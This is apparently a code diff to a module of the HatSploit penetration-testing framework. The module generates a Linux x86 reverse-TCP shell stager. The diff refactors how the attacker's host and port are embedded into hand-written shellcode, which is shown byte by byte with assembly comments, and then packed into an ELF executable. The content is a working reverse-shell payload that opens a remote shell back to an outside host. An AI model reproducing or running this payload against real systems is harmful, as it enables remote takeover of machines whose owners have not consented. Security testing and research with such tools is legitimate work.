@@ -25,11 +25,11 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 from utils.tcp.tcp import TCPClient
 
 
-class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
+class HatSploitPayload(Payload, HatVenom, TCPClient):
     details = {
         'Category': "stager",
         'Name': "Linux x86 Shell Reverse TCP",
@@ -62,24 +62,16 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
-        local_host, local_port, executable_format = self.parse_options(self.options)
+        local_host, local_port = self.parse_options(self.options)
 
-        local_host = self.host_to_bytes(local_host)
-        local_port = self.port_to_bytes(local_port)
-
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
+        offsets = {
+            'lhost': local_host,
+            'lport': local_port
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -98,8 +90,9 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
             b"\xcd\x80"              # int 0x80
             b"\x49"                  # dec ecx
             b"\x79\xf9"              # jns 0x11
-            b"\x68" + local_host +  # push ip addr
-            b"\x68\x02\x00" + local_port +  # push port
+            b"\x68:lhost:ip:"        # push ip addr
+            b"\x68\x02\x00"          # push port
+            b":lport:port:"
             b"\x89\xe1"              # mov ecx,esp
             b"\xb0\x66"              # mov al,0x66 (sys_socketcall)
             b"\x50"                  # push eax
@@ -120,6 +113,6 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'x86', shellcode)
+        payload = self.generate('elf', 'x86', shellcode, offsets)
 
         return payload
